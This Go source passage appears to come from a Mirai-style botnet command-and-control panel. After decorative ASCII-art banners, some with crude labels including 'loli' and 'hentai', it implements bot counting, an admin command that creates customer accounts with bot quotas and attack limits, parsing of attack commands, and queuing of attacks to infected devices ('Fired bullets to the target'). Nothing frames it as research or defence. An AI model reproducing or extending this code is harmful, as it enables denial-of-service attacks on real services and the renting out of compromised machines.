            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mLove youuuuu...\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mWe are love youuuuuuuuu... \033[38mBOOMMM!\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
        }

        if err != nil || cmd == "pikachu" || cmd == "PIKACHU" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣠⣤⣶⣶  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢰⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣾⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        if err != nil || cmd == "saitama" || cmd == "SAITAMA" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲.\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀⢳⡀⠀⡏⠀⠀⠀⠀⠀⢷\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀ ⡇\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀⣸⠀⠀OK⠀ ⡇\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀⣿⠀⢹⠀⠀⠀⠀⠀ ⡇\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀⡇⠀⠀⠀⠀⡼\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀⠘⠤⣄⣠⠞\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁\r\n"))
            this.conn.Write([]byte("\033[37m   ⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀\r\n"))
            this.conn.Write([]byte("\033[37m   ⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿\r\n"))
            this.conn.Write([]byte("\033[37m   ⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸\r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣧⣀⣿………⣀⣰⣏⣘⣆⣀r\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        if err != nil || cmd == "uwu" || cmd == "UWU" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ⡆⣐⢕⢕⢕⢕⢕⢕⢕⢕⠅⢗⢕⢕⢕⢕⢕⢕⢕⠕⠕⢕⢕⢕⢕⢕⢕⢕⢕⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢐⢕⢕⢕⢕⢕⣕⢕⢕⠕⠁⢕⢕⢕⢕⢕⢕⢕⢕⠅⡄⢕⢕⢕⢕⢕⢕⢕⢕⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢕⢕⢕⢕⢕⠅⢗⢕⠕⣠⠄⣗⢕⢕⠕⢕⢕⢕⠕⢠⣿⠐⢕⢕⢕⠑⢕⢕⠵⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢕⢕⢕⢕⠁⢜⠕⢁⣴⣿⡇⢓⢕⢵⢐⢕⢕⠕⢁⣾⢿⣧⠑⢕⢕⠄⢑⢕⠅⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢕⢕⠵⢁⠔⢁⣤⣤⣶⣶⣶⡐⣕⢽⠐⢕⠕⣡⣾⣶⣶⣶⣤⡁⢓⢕⠄⢑⢅⢑  \r\n"))
            this.conn.Write([]byte("\033[37m   ⠍⣧⠄⣶⣾⣿⣿⣿⣿⣿⣿⣷⣔⢕⢄⢡⣾⣿⣿⣿⣿⣿⣿⣿⣦⡑⢕⢤⠱⢐  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢠⢕⠅⣾⣿⠋⢿⣿⣿⣿⠉⣿⣿⣷⣦⣶⣽⣿⣿⠈⣿⣿⣿⣿⠏⢹⣷⣷⡅⢐  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣔⢕⢥⢻⣿⡀⠈⠛⠛⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⡀⠈⠛⠛⠁⠄⣼⣿⣿⡇⢔  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢕⢕⢽⢸⢟⢟⢖⢖⢤⣶⡟⢻⣿⡿⠻⣿⣿⡟⢀⣿⣦⢤⢤⢔⢞⢿⢿⣿⠁⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢕⢕⠅⣐⢕⢕⢕⢕⢕⣿⣿⡄⠛⢀⣦⠈⠛⢁⣼⣿⢗⢕⢕⢕⢕⢕⢕⡏⣘⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢕⢕⠅⢓⣕⣕⣕⣕⣵⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣷⣕⢕⢕⢕⢕⡵⢀⢕⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢑⢕⠃⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⢕⢕⢕  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣆⢕⠄⢱⣄⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢁⢕⢕⠕⢁  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣦⡀⣿⣿⣷⣶⣬⣍⣛⣛⣛⡛⠿⠿⠿⠛⠛⢛⣛⣉⣭⣤⣂⢜⠕⢑⣡⣴⣿  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        if err != nil || cmd == "loli" || cmd == "LOLI" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ⡿⠋⠄⣀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⠻⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⢿⣿⣿⣿⣮⠛⣿⣿⣿⣿⣿⣿⡆  \r\n"))
            this.conn.Write([]byte("\033[37m   ⡟⢻⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⠄⡀⢬⣭⣻⣷⡌⢿⣿⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⠃⣸⡀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣆⢹⣿⣿⣿⡈⢿⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⠄⢻⡇⠄⢛⣛⣻⣿⣿⣿⣿⣿⣿⣿⣿⡆⠹⣿⣆⠸⣆⠙⠛⠛⠃⠘⣿⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⠄⠸⣡⠄⡈⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠁⣠⣉⣤⣴⣿⣿⠿⠿⠿⡇⢸⣿⣿⣿  \r\n"))
            this.conn.Write([]byte("\033[37m   ⠄⡄⢿⣆⠰⡘⢿⣿⠿⢛⣉⣥⣴⣶⣿⣿⣿⣿⣻⠟⣉⣤⣶⣶⣾⣿⡄⣿⡿⢸  \r\n"))
            this.conn.Write([]byte("\033[37m   ⠄⢰⠸⣿⠄⢳⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⡇⢻⡇⢸  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢷⡈⢣⣡⣶⠿⠟⠛⠓⣚⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⠇⠘  \r\n"))
            this.conn.Write([]byte("\033[37m   ⡀⣌⠄⠻⣧⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⢿⣿⣿⣿⣿⣿⡟⠘⠄⠄  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣷⡘⣷⡀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡋⢀⣠⣤⣶⣶⣾⡆⣿⣿⣿⠟⠁⠄⠄⠄⠄  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣷⡘⣿⡀⢻⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣿⣿⣿⣿⣷⡿⠟⠉⠄⠄⠄⠄⡄⢀  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣷⡈⢷⡀⠙⠛⠻⠿⠿⠿⠿⠿⠷⠾⠿⠟⣛⣋⣥⣶⣄⠄⢀⣄⠹⣦⢹⣿  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        if err != nil || cmd == "hentai" || cmd == "HENTAI" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⠟⣽⣿⣿⣿⣿⣿⢣⠟⠋⡜⠄⢸⣿⣿⡟⣬⢁⠠⠁⣤⠄⢰⠄⠇⢻⢸  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢏⣾⣿⣿⣿⠿⣟⢁⡴⡀⡜⣠⣶⢸⣿⣿⢃⡇⠂⢁⣶⣦⣅⠈⠇⠄⢸⢸  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣹⣿⣿⣿⡗⣾⡟⡜⣵⠃⣴⣿⣿⢸⣿⣿⢸⠘⢰⣿⣿⣿⣿⡀⢱⠄⠨⢸  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⡇⣿⢁⣾⣿⣾⣿⣿⣿⣿⣸⣿⡎⠐⠒⠚⠛⠛⠿⢧⠄⠄⢠⣼  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⠃⠿⢸⡿⠭⠭⢽⣿⣿⣿⢂⣿⠃⣤⠄⠄⠄⠄⠄⠄⠄⠄⣿⡾  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣼⠏⣿⡏⠄⠄⢠⣤⣶⣶⣾⣿⣿⣟⣾⣾⣼⣿⠒⠄⠄⠄⡠⣴⡄⢠⣿⣵  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣳⠄⣿⠄⠄⢣⠸⣹⣿⡟⣻⣿⣿⣿⣿⣿⣿⡿⡻⡖⠦⢤⣔⣯⡅⣼⡿⣹  \r\n"))
            this.conn.Write([]byte("\033[37m   ⡿⣼⢸⠄⠄⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣕⡜⡌⡝⡸⠙⣼⠟⢱⠏  \r\n"))
            this.conn.Write([]byte("\033[37m   ⡇⣿⣧⡰⡄⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣋⣪⣥⢠⠏⠄  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣧⢻⣿⣷⣧⢻⣿⣿⣿⡇⠄⢀⣀⣀⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠂⠄⠄  \r\n"))
            this.conn.Write([]byte("\033[37m   ⢹⣼⣿⣿⣿⣧⡻⣿⣿⣇⣴⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣰⠄⠄⠄  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣼⡟⡟⣿⢸⣿⣿⣝⢿⣿⣾⣿⣿⣿⢟⣾⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⡀⡀  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⢰⣿⢹⢸⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠄⠄⣸⢰⡇  \r\n"))
            this.conn.Write([]byte("\033[37m   ⣿⣾⣹⣏⢸⣿⣿⣿⣿⣿⣷⣍⡻⣛⣛⣛⡉⠁⠄⠄⠄⠄⠄⠄⢀⢇⡏⠄  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

		if cmd == "bots" || cmd == "BOTS" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s: \x1b[1;35m%d\033[0m\r\n\033[0m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[1;34mTotal bots: \033[1;34m[\033[1;35m%d\033[1;34m]\r\n\033[0m", botCount)))
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "adduser" {
			this.conn.Write([]byte("Enter new username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Enter new password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("Max attack duration (-1 for none): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("Cooldown time (0 for none): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}
		if cmd[0] == '*' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '-' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[1;32m[︻┳═一] \033[1;36m%d \033[1;32mFired bullets to the target\r\n", YotCount)))
				} else {
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
